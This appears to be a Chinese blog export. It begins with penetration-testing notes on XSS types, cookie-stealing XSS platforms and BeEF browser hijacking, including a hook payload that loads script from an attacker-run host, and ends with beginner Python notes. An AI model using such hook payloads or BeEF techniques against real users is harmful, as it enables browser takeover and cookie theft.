<li>​    结合其他漏洞，如csrf,实施进一步危害；</li>
<li>​    提升用户权限，包括进一步渗透网站；</li>
<li>​    传播跨站脚本蠕虫等</li>
</ul>
</li>
<li><p>修复</p>
<ul>
<li>​    见绕过课程对比参考</li>
</ul>
</li>
</ul>
<p>2、XSS跨站分类(上)-反射&amp;存储&amp;DOM</p>
<p>3、XSS跨站利用(上)-工具BEEF&amp;XSS平台</p>
<p>#案例1-XSS产生原理演示-数据输入输出</p>
<ul>
<li>核心：就是我们能控制页面的显示内容，比如浏览器内核版本在线检测，它是识别我们的user-agent，我们可以抓包，修改agent，并且页面显示的agent和我们修改的一样，这就代表我们可以控制页面显示的内容，此时如果我们将此内容修改为xss代码，那么可能就可以造成攻击</li>
<li>疑问：如果将我们的 弹出xss代码原封不动的显示了，却没造成应有的效果咋办？<ul>
<li>可能是浏览器将我们的xss代码当作字符串来处理了，我们可以右键当前页面，查看元素，然后尝试绕过（闭合标签来绕过）</li>
</ul>
</li>
</ul>
<p>#案例2-实例反射型XSS演示-UA查询平台</p>
<ul>
<li>攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。</li>
<li>网站的搜索栏、用户登录入口、输入表单等地方</li>
</ul>
<p>​    </p>
<p>在线xss平台的使用</p>
<ul>
<li>功能：有很多功能，可以自行尝试，但是有些功能需要配置参数，需要自行百度</li>
<li>新建项目，名字和备注随便输入</li>
<li>配置模块，选择默认模块—-无keepsession（这个就默认可以读取cookie了）</li>
</ul>
<p>在线xss平台的危害：</p>
<ul>
<li>我们获取到的数据，网站管理员也相当于间接获取到了，所以如果操作敏感的一些东西的话，还是建议使用自己搭建的平台</li>
</ul>
<p>#案例3-实例存储型XSS演示-业务订单系统</p>
<ul>
<li>随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户浏览器中得到执行。</li>
<li>蓝莲花xss平台源码（自行搭建）：<a href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></li>
<li>论坛、博客、留言板、网站的留言、评论、日志等交互处</li>
</ul>
<p>工具：Beef 使用&amp;功能说明</p>
<ul>
<li><p>优点：功能多、强大，当利用xss上线后，还可以进行其他攻击，比如：url跳转、获取cookie、社会工程学攻击（flash钓鱼，通过提交一个的图片地址、以及文件下载地址（可以是木马，配合cs等））、内网信息收集（端口等）</p>
<ul>
<li><img src="/source/images/image-20210804213306095.png" alt="image-20210804213306095"></li>
</ul>
</li>
<li><p>缺点：必须要对方不关闭当前浏览器才行，也就是只能在对方在存在payload的页面，我们才能在beef控制端进行攻击，一旦对方关闭页面，那么就无法攻击了</p>
<ul>
<li><p>绕过方法：使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间</p>
<p>除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap</p>
</li>
</ul>
</li>
<li><p>beff利用方法以及安卓上线方法：<a href="https://blog.csdn.net/jsd2honey/article/details/78683938">BeEF 介绍_jsd2root的博客-CSDN博客_beef</a></p>
<ul>
<li>攻击手机需要学习怎么用php调用 PhoneGap API</li>
</ul>
</li>
<li><p>kali命令行安装Beff或者自己下载安装：<a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
</li>
<li><p>kali下用法：</p>
<ul>
<li><p>apt-get install beef-xss</p>
</li>
<li><p>cd /usr/share/beef-xss</p>
</li>
<li><p>ls</p>
</li>
<li><p>修改默认密码：beff不允许使用默认密码：vim /etc/beef-xss/config.yaml     我这里使用的用户名是beef，密码是我自己常用的密码</p>
</li>
<li><p>./beef    </p>
</li>
<li><p>根据上一步运行得到的输出信息，有2个很重要</p>
<ul>
<li>其中Hook URL 是一个js地址，我们只要将该js地址复制，并且插入到xss里，如果对方中招，那么对方就会在beef上线，可以通过UI URL 控制端进行查看</li>
<li>其中API key是用来自动执行模块的，因为beef是实时的，所以我们完全可以使用api来批量执行命令从而绕过其实时的缺陷: 40bf0f710021f9c73e96270c5e2cf233c15eb4f5</li>
<li>其中 UI  URL 是控制端，直接网页里输入打开<ul>
<li>账号和密码都是：beef</li>
<li>进去后，左侧有两个功能<ul>
<li>Online Browsers  :这个分类下显示的是在线的目标</li>
<li>Offline Browsers ：这个分类下显示的是当时上线的目标，后面可能因为其他原因最后下线的目标</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>复制Hook URL ,构造xss</p>
<ul>
<li><pre><code class="javascript">&lt;script src=http://192.168.46.130:3000/hook.js&gt;&lt;/script&gt;  #其中，src的地址就是刚才复制的Hook URL地址，需要根据beff实际生成的地址进行替换#前提：如果想要上线，最好将beff部署在外网服务器才能上线，否则处在内网中，则无法上线,可以使用花生壳内网穿透来实现
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>#案例4-实例DOM型XSS演示-Pikachu_XSS</p>
<ul>
<li>我们可以把DOM理解为一个一个访问HTML的标准的编程接口。</li>
<li>DOM是一个前端的接口，并没有和后端做任何的交互。</li>
<li>所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。</li>
</ul>
<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
<p><a href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习笔记(老男孩)</title>
    <url>/2021/08/10/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E8%80%81%E7%94%B7%E5%AD%A9/</url>
    <content><![CDATA[<h1 id="python学习笔记（老男孩s21）"><a href="#python学习笔记（老男孩s21）" class="headerlink" title="python学习笔记（老男孩s21）"></a>python学习笔记（老男孩s21）</h1><p>——————————-by：发飙的登山包——————————————<br>gitee项目地址：<a href="https://gitee.com/python_road/old_boy_python_self_study">https://gitee.com/python_road/old_boy_python_self_study</a>     附带尹成python、老男孩s1 python学习笔记、学习期间写的各种py脚本</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="0-1-学习方法"><a href="#0-1-学习方法" class="headerlink" title="0.1 学习方法"></a>0.1 学习方法</h3><ul>
<li>写笔记<ul>
<li>每天看笔记</li>
</ul>
</li>
<li>思维导图<ul>
<li>每周最后一天，方便回顾复习</li>
</ul>
</li>
<li>做作业<ul>
<li>如果做题碰到笔记里没有的，就将该知识点添加到笔记里</li>
</ul>
</li>
</ul>
<h3 id="0-2-编程核心思想"><a href="#0-2-编程核心思想" class="headerlink" title="0.2 编程核心思想"></a>0.2 编程核心思想</h3><ul>
<li>将客户要求进行拆分，将功能拆分成各个小块，然后再进行拼接</li>
</ul>
<span id="more"></span>








<h2 id="第一章-计算机基础"><a href="#第一章-计算机基础" class="headerlink" title="第一章 计算机基础"></a>第一章 计算机基础</h2><h3 id="1-1-硬件"><a href="#1-1-硬件" class="headerlink" title="1.1  硬件"></a>1.1  硬件</h3><p>计算机基本的硬件由：CPU / 内存 / 主板 / 硬盘 / 网卡  / 显卡 等组成，只有硬件但硬件之间无法进行交流和通信。</p>
<h3 id="1-2-操作系统"><a href="#1-2-操作系统" class="headerlink" title="1.2 操作系统"></a>1.2 操作系统</h3><p>操作系统用于协同或控制硬件之间进行工作，常见的操作系统有那些:</p>
<ul>
<li>windows</li>
<li>linux<ul>
<li>centos 【公司线上一般用】</li>
</ul>
</li>
<li>mac</li>
</ul>
<h3 id="1-3-解释器或编译器"><a href="#1-3-解释器或编译器" class="headerlink" title="1.3  解释器或编译器"></a>1.3  解释器或编译器</h3><p>编程语言的开发者写的一个工具，将用户写的代码转换成010101交给操作系统去执行。</p>
<h4 id="1-3-1-解释和编译型语言"><a href="#1-3-1-解释和编译型语言" class="headerlink" title="1.3.1  解释和编译型语言"></a>1.3.1  解释和编译型语言</h4><p>编译型：</p>
<ul>
<li>含义：日本翻译，等客户全部说完了，然后统一翻译。在实际中就是，这种语言先将所有代码全部统一翻译，然后生成一个编译完成后的文件，需要用户再将改文件提交给计算机执行才行，必须要有执行这一步</li>
<li>代表语言：c++，c#，JAVA，c</li>
</ul>
<p>解释型：</p>
<ul>
<li>含义：日本翻译，实时翻译，客户说一句，它就翻译一句。我们将代码给解释器之后，解释器会一句一句的解释每一条语句，解释一条就自动提交给计算机一条，这里就省去了人工提交编译后的文件的步骤了，这里是实时的，解释一条，自动提交一条。</li>
<li>代表语言：python，ruby，php</li>
</ul>
<h4 id="1-3-2-在linux中指定解释器"><a href="#1-3-2-在linux中指定解释器" class="headerlink" title="1.3.2 在linux中指定解释器"></a>1.3.2 在linux中指定解释器</h4><p>在linux中执行脚本方法：解释器  文件路径</p>
<ul>
<li>给文件赋予一个可执行的权限</li>
<li>终端输入：./a.py,程序会寻找解释器来执行(自动去找脚本文件的第一行)，相当于 #! /usr/bin/env python a.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python     #在linux中指定解释器的路径 </span></span><br><span class="line">- -*- coding:utf-<span class="number">8</span> -*-      <span class="comment">#指定以utf-8编码打开</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;你好&#x27;</span>)</span><br></pre></td></tr></table></figure>





<h3 id="1-4-软件（应用程序）"><a href="#1-4-软件（应用程序）" class="headerlink" title="1.4 软件（应用程序）"></a>1.4 软件（应用程序）</h3><p>软件又称为应用程序，就是我们在电脑上使用的工具，类似于：记事本 / 图片查看 / 游戏</p>
<h3 id="1-5-进制"><a href="#1-5-进制" class="headerlink" title="1.5 进制"></a>1.5 进制</h3><p>进制的本质：</p>
<ul>
<li>对于计算机而言无论是文件存储 / 网络传输输入本质上都是：二进制（010101010101），如：电脑上存储视频/图片/文件都是二进制； QQ/微信聊天发送的表情/文字/语言/视频 也全部都是二进制。</li>
</ul>
<p>进制：</p>
<ul>
<li>2进制，计算机内部。</li>
<li>8进制</li>
<li>10进制，人来进行使用，一般情况下计算机可以获取10进制，然后再内部会自动转换成二进制并操作。</li>
<li>16进制，一般用于表示二进制（用更短的内容表示更多的数据），一版是：\x 开头。</li>
</ul>
<table>
<thead>
<tr>
<th>二进制</th>
<th>八进制</th>
<th>十进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>10</td>
<td>2</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>3</td>
<td>3</td>
<td>3</td>
</tr>
</tbody></table>
<h2 id="第二章-Python入门"><a href="#第二章-Python入门" class="headerlink" title="第二章 Python入门"></a>第二章 Python入门</h2><h3 id="2-1-环境的安装"><a href="#2-1-环境的安装" class="headerlink" title="2.1 环境的安装"></a>2.1 环境的安装</h3><ul>
<li>解释器：py2 / py3 （环境变量）</li>
<li>开发工具：pycharm（见附录）</li>
</ul>
<h3 id="2-2-编码"><a href="#2-2-编码" class="headerlink" title="2.2 编码"></a>2.2 编码</h3><h4 id="2-2-1-编码基础"><a href="#2-2-1-编码基础" class="headerlink" title="2.2.1 编码基础"></a>2.2.1 编码基础</h4><ul>
<li>ascii：256位，由英文字母、标点符号注册，一个符号占8位，1个字节（一个字节占8位），总共有2**8=256个</li>
<li>unicode(万国码)：解决全球语言问题，ascii只支持英文，unicode支持全球语言，4个字节总共有2**32个</li>
<li>utf-8：对万国码进行压缩，用尽量少的位数表示一个东西，最少用1字节=8位，最多用4字节=32位，中文：3字节=24位表示，以8位一组，从末尾开始，数8位，作为一组，如果第9位是非0，那么就再往前取一组</li>
<li>GBK：专属于亚洲的编码，中文也包含在内，中文占2个字节</li>
<li>gb2312：专属于亚洲的编码，中文也包含在内，中文占两个字节</li>
</ul>
<h4 id="2-2-2-python编码相关"><a href="#2-2-2-python编码相关" class="headerlink" title="2.2.2 python编码相关"></a>2.2.2 python编码相关</h4><p>对于Python默认解释器编码：</p>
<ul>
<li>py2： ascii</li>
<li>py3： unicode</li>
</ul>
<p>如果想要修改默认编码，则可以使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>对于操作文件时，要按照：以什么编写写入，就要用什么编码去打开，否则会出现乱码。</li>
<li>不管使用的何种python版本进行写代码，都建议再开头加上文件头代码， 这样就避免了编码冲突</li>
</ul>
<h4 id="2-2-3-编码在数据存储中的应用"><a href="#2-2-3-编码在数据存储中的应用" class="headerlink" title="2.2.3 编码在数据存储中的应用"></a>2.2.3 编码在数据存储中的应用</h4><p>问题1：既然gbk和gb2312中文占用的字节小，消耗的资源小，那为什么还要用utf-8编码（3个字节）？</p>
<ol>
<li>gbk、gb2312支持的范围小</li>
<li>英文是主流语言，各种最新的、最成熟的框架、数据都是用utf-8编码储存或者编写的，如果使用gbk、gb2312将会导致编码冲突，如果将utf-8修改成gbk、gb2312花费的时间太多，并且过程十分繁琐</li>
</ol>
<p>问题2：数据写入磁盘的节本流程（编码相关）：写入数据到文本里</p>
<ul>
<li><p>首先需要新建文本，选择文本的编码，例如utf8编码</p>
</li>
<li><p>接着执行写入命令 write(‘你好’) ，这里首先会将 ‘你好’(python3中，字符串是用unicode编码格式) 按照utf-8编码格式进行编码，编码成字节类型(bytes)，然后将二进制写入磁盘</p>
</li>
<li><p>特殊情况：我们用wb模式打开文本(此时无encoding)，此时如果需要写入文本，因为没有指定编码，所以只能write()接收的参数只能是二进制，所以我们需要提前将我们的数据转化为二进制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;你好&#x27;</span></span><br><span class="line">b = a.encode(<span class="string">&#x27;utf-8&#x27;</span>)   <span class="comment">#以utf-8的方式进行逆转编码，转化为二进制</span></span><br><span class="line"><span class="built_in">print</span>(b)   <span class="comment">#结果为：b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>问题3：如何将二进制解码成其他编码的数据？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span>   <span class="comment">#二进制</span></span><br><span class="line">b = a.decode(<span class="string">&#x27;utf-8&#x27;</span>)   <span class="comment">#将二进制按照utf-8编码的形式进行解码</span></span><br><span class="line"><span class="built_in">print</span>(b)   <span class="comment">#结果为：你好</span></span><br></pre></td></tr></table></figure>







<h4 id="2-2-4-txt文档unicode编码差异"><a href="#2-2-4-txt文档unicode编码差异" class="headerlink" title="2.2.4 txt文档unicode编码差异"></a>2.2.4 txt文档unicode编码差异</h4><p>在windows的txt文档，另存为选择编码的时候，有一个unicode，这个并不是万国码，这里实际上是utf-16，这里可以说是微软搞错了。</p>
<h4 id="2-2-5-编码转换"><a href="#2-2-5-编码转换" class="headerlink" title="2.2.5 编码转换"></a>2.2.5 编码转换</h4><p>python2和python3中编码转换的区别：</p>
<ul>
<li><p>python2：是基于ascii编码表进行转换的，因为其内置是ascii</p>
<p>缺点：支持转换的范围太小，只有256个，不能转汉字</p>
</li>
<li><p>python3：是基于unicode编码表进行转换的，因为其内置是unicode</p>
<p>优点：支持的范围广，可以将汉字转换为数字</p>
</li>
<li><p>int 转str</p>
</li>
<li><p>str转int</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将数字转换为unicode编码</span></span><br><span class="line">a = <span class="number">666</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(a))  <span class="comment">#结果为：ʚ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将str转换为数字：基于unicode编码</span></span><br><span class="line">a = <span class="string">&#x27;我&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(a))   <span class="comment">#结果为：25105</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-3-变量"><a href="#2-3-变量" class="headerlink" title="2.3 变量"></a>2.3 变量</h3><h4 id="2-3-1-变量存在的意义"><a href="#2-3-1-变量存在的意义" class="headerlink" title="2.3.1 变量存在的意义"></a>2.3.1 变量存在的意义</h4><p>为某个值创建一个“外号”，以后在使用时候通过此外号就可以直接调用。</p>
<h4 id="2-3-2-变量名命名规范"><a href="#2-3-2-变量名命名规范" class="headerlink" title="2.3.2 变量名命名规范"></a>2.3.2 变量名命名规范</h4><p>要求：</p>
<ul>
<li>只能包含：字母、数字、下划线</li>
<li>数字不能开头</li>
<li>不能是python关键字</li>
</ul>
<p>建议：</p>
<ul>
<li>建议使用英文来命名</li>
<li>建议全局变量全部用大写英文，局部变量用小写英文</li>
<li>见名知意</li>
<li>名字长用下划线链接</li>
</ul>
<h3 id="2-4-输入和输出"><a href="#2-4-输入和输出" class="headerlink" title="2.4 输入和输出"></a>2.4 输入和输出</h3><h4 id="2-4-1-输入"><a href="#2-4-1-输入" class="headerlink" title="2.4.1 输入"></a>2.4.1 输入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;提示语：&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="2-4-2-输出"><a href="#2-4-2-输出" class="headerlink" title="2.4.2 输出"></a>2.4.2 输出</h4><ul>
<li><p>print(你想要输入的东西)</p>
</li>
<li><p>print(‘内容’,sep=’*’,end=’’)</p>
<ul>
<li><p>sep指定打印内容之间的间隔，一行之间的，默认是空格</p>
</li>
<li><p>end指定每一行print语句的间隔，默认是换行符</p>
<p>技巧：将多行内容显示在一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过end取消默认的每条print语句的换行符，将其替换为空</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;爱&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;你&#x27;</span>)</span><br><span class="line"><span class="comment">#结果为&#x27;我爱你&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不修改seps</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;爱&#x27;</span>,<span class="string">&#x27;你&#x27;</span>)   <span class="comment">#结果为   &#x27;我 爱 你&#x27;   中间默认用空格隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改seps</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;爱&#x27;</span>,<span class="string">&#x27;你&#x27;</span>,sep=<span class="string">&#x27;*&#x27;</span>)   <span class="comment">#结果为   我*爱*你   中间默认用*隔开</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="2-4-3-py2、py3输入和输出区别"><a href="#2-4-3-py2、py3输入和输出区别" class="headerlink" title="2.4.3 py2、py3输入和输出区别"></a>2.4.3 py2、py3输入和输出区别</h4><p>输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">raw_input()  <span class="comment">#py2</span></span><br><span class="line"><span class="built_in">input</span>()    <span class="comment">#py3</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;你好&quot;</span>   <span class="comment"># py2不需要括号</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;你好&quot;</span>)    <span class="comment"># py3</span></span><br></pre></td></tr></table></figure>



<h3 id="2-5-条件语句"><a href="#2-5-条件语句" class="headerlink" title="2.5 条件语句"></a>2.5 条件语句</h3><h4 id="2-5-1-if…else"><a href="#2-5-1-if…else" class="headerlink" title="2.5.1 if…else"></a>2.5.1 if…else</h4><p>基本语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件 :</span><br><span class="line">    执行语句</span><br><span class="line"> <span class="keyword">else</span> :</span><br><span class="line">    执行语句</span><br></pre></td></tr></table></figure>



<h4 id="2-5-2-if…elif…else"><a href="#2-5-2-if…elif…else" class="headerlink" title="2.5.2 if…elif…else"></a>2.5.2 if…elif…else</h4><p>注意点：如果if..elif语句过多，建议使用字典，活着了列表来实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件 :</span><br><span class="line">    执行语句</span><br><span class="line"> <span class="keyword">else</span> :</span><br><span class="line">    执行语句</span><br></pre></td></tr></table></figure>

<h3 id="2-6-循环语句"><a href="#2-6-循环语句" class="headerlink" title="2.6 循环语句"></a>2.6 循环语句</h3><h4 id="2-6-1-while"><a href="#2-6-1-while" class="headerlink" title="2.6.1 while"></a>2.6.1 while</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件 :    执行语句</span><br></pre></td></tr></table></figure>



<h4 id="2-6-2-for"><a href="#2-6-2-for" class="headerlink" title="2.6.2 for"></a>2.6.2 for</h4><h5 id="2-6-2-1-range-高级用法"><a href="#2-6-2-1-range-高级用法" class="headerlink" title="2.6.2.1 range()高级用法"></a>2.6.2.1 range()高级用法</h5><p>range():</p>
<ul>
<li><p>python2和python3中的区别：</p>
<p>python2:</p>
<ul>
<li>range():立刻执行。缺点是，如果范围较大，十分浪费资源</li>
<li>xrange(): 需要配合for遍历才执行。优点：需要调用时使用for才执行，节约资源</li>
</ul>
<p>python3：</p>
<ul>
<li>range()：相当于python2中的xrange()，更高效，更节约资源</li>
</ul>
</li>
<li><p>参数为单个数字range(5)：该数字代表执行5次</p>
</li>
<li><p>参数为2个数字range(0,5)：表示从数字0递增到数字5，不包括5</p>
</li>
<li><p>参数为3个数字range(0,6,2)：第三个数字为步长</p>
<ul>
<li>如果没有步长，则默认是正数1</li>
<li>如果步长为负数，则代表递减</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参数为单个数字range(5)：该数字代表执行5次for i in range(5) :    print(&#x27;hello&#x27;)   &#x27;&#x27;&#x27;&#x27;结果为：hellohellohellohellohello&#x27;&#x27;&#x27;#参数为2个数字range(0,5)：表示从数字0递增到数字5，不包括5for i in range(0,5) :    print(i)  &#x27;&#x27;&#x27;结果为：01234&#x27;&#x27;&#x27; #参数为3个数字range(0,6,2)：第三个数字为步长 for i in range(0,6,2) :    print(i)      #不包括6&#x27;&#x27;&#x27;结果为：024&#x27;&#x27;&#x27;#参数为3个数字range(6,0,-1)：步长为负数，所以递减for i in range(6,0,-1) :    print(i)   #不包括0&#x27;&#x27;&#x27;结果为：654321&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>应用实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#打印出0-100之间的所有偶数:完全可以利用步长来实现for i in range(0,101,2) :    print(i)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-6-2-2-for与语句开关"><a href="#2-6-2-2-for与语句开关" class="headerlink" title="2.6.2.2 for与语句开关"></a>2.6.2.2 for与语句开关</h5><p>for实现评论过滤系统：</p>
<ul>
<li><p>原理：用户输入字符，存在关键字，就将关键字替换掉，然后给其显示过滤后的字符；如果不存在敏感字，则直接显示</p>
</li>
<li><p>技巧：for循环前设置一个变量，让其为正常状态，然后for循环开始，for循环里如果满足某个条件，就修改变量，以此来，接着再在for循环外（语句最后）打印该变量，在本例中，如果用户输入的语句里没有敏感词，就直接打印，如果有，就修改掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;用户输入字符，存在关键字，就将关键字替换掉，然后给其显示过滤后的字符；如果不存在敏感字，则直接显示&#x27;&#x27;&#x27;</span>message = <span class="built_in">input</span>(<span class="string">&#x27;请输入内容：&#x27;</span>)   <span class="comment">#初始状态text_check = [&#x27;加&#x27;,&#x27;微信&#x27;,&#x27;www.&#x27;]for i in text_check :    if i in message :        message = message.replace(i,&#x27;**&#x27;)   #有敏感字就替换    else :        passprint(message)    </span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>for实现是否存在敏感字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#if 实现a = &#x27;oldboy&#x27;switch = &#x27;不存在敏感字符&#x27;   #开关初始状态 if &#x27;ld&#x27; in a :        switch = &#x27;存在敏感字符&#x27;                 #变更开关 print(switch)             #打印开关</span></span><br></pre></td></tr></table></figure>







<h4 id="2-6-3-break，continue"><a href="#2-6-3-break，continue" class="headerlink" title="2.6.3 break，continue"></a>2.6.3 break，continue</h4><p>特性：</p>
<ul>
<li>continue：当碰到该函数，程序会不再往下执行，会不再执行本次循环，会回到条件处，直接执行下一次循环，直接回到当前while循环的条件处进行再次判别</li>
<li>break：跳出当前循环，仅仅跳出当前的循环</li>
</ul>
<p>continue在while和for中的区别：</p>
<ul>
<li><p>whiile</p>
<p>在while中，如果碰到continue，后续的代码将不再执行，直接回到while的条件判定处，重新进行判定，因为while自身不携带递增属性，所以如果构造的递增语句在continue之前，那么循环会进入下一轮，否则就一直执行相同的循环</p>
</li>
<li><p>for</p>
<p>在for中，如果碰到contine，后续的代码将不再执行，直接回到for的开头，接着开始第二次循环（因为for自带递增属性，所以该循环会一直递增下去），第二轮碰到continue，会继续回到开头，开始第三轮循环</p>
</li>
</ul>
<h4 id="2-6-4-while…else"><a href="#2-6-4-while…else" class="headerlink" title="2.6.4 while…else"></a>2.6.4 while…else</h4><p>while … else中else的触发条件：</p>
<p>​    当while的条件不满足时，才执行else语句，<em><strong>需要注意的是，如果while语句并不是因为条件不满足，而是因为其他情况：例如强制性跳出循环(比如break)的情况下，else语句不会被执行</strong></em></p>
<ul>
<li>范例一（无break）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = 1<span class="keyword">while</span> count &lt;= <span class="number">3</span> :    <span class="built_in">print</span>(count)	count += 1<span class="keyword">else</span> :	<span class="built_in">print</span>(<span class="string">&#x27;跳出了循环，此时count为:&#x27;</span>+<span class="built_in">str</span>(count) )  </span><br></pre></td></tr></table></figure>

<ul>
<li>结果为：</li>
</ul>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402194105252.png" alt="image-20200402194105252"></p>
<ul>
<li>范例2:(while在被强制性跳出（并不是条件不满足的情况下），else不执行)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = 1<span class="keyword">while</span> count &lt;= <span class="number">3</span> :    <span class="built_in">print</span>(count)    <span class="keyword">if</span> count == <span class="number">2</span> :        <span class="keyword">break</span>	count += 1<span class="keyword">else</span> :	<span class="built_in">print</span>(<span class="string">&#x27;跳出了循环，此时count为:&#x27;</span>+<span class="built_in">str</span>(count) )  </span><br></pre></td></tr></table></figure>

<ul>
<li><p>结果：</p>
</li>
<li><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402194915134.png" alt="image-20200402194915134"></p>
</li>
</ul>
<h4 id="2-6-5-while、for的区别"><a href="#2-6-5-while、for的区别" class="headerlink" title="2.6.5 while、for的区别"></a>2.6.5 while、for的区别</h4><p>while:</p>
<p>适用于无穷的循环，需要提前定义一个变量，并且构造递增语句才能实现递增</p>
<p>for</p>
<ul>
<li>含义：适用于有限的循环，最大的特性是遍历</li>
<li>特性：自带递增属性，而while没有，需要定义变量来递增</li>
</ul>
<h3 id="2-7-字符串格式化"><a href="#2-7-字符串格式化" class="headerlink" title="2.7 字符串格式化"></a>2.7 字符串格式化</h3><h4 id="2-7-1-用-来格式化"><a href="#2-7-1-用-来格式化" class="headerlink" title="2.7.1 用%来格式化"></a>2.7.1 用%来格式化</h4><ul>
<li><p>%d</p>
</li>
<li><p>%s</p>
</li>
<li><p>%%(主要是用来格式化%这个符号，有时候我们需要文本里出现%这个字符，那么就需要两个%)</p>
</li>
<li><p>注意点：接受参数的时候，最后一定要是逗号（,）结尾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用法1：</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;今天有50%的可能%s&#x27;</span>%(<span class="string">&#x27;下雨&#x27;</span>,))  <span class="comment">#错误写法，程序报错,必须要使用两个%</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;今天有50%%的可能%s&#x27;</span>%(<span class="string">&#x27;下雨&#x27;</span>,))  <span class="comment">#正确写法</span></span><br><span class="line"><span class="comment">#结果为：今天有50%的可能下雨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用法2：结合变量使用</span></span><br><span class="line">guess = <span class="string">&#x27;今天有50%%的可能%s&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(guess%(<span class="string">&#x27;下雨&#x27;</span>,))  <span class="comment">#正确写法</span></span><br><span class="line"><span class="comment">#结果为：今天有50%的可能下雨</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
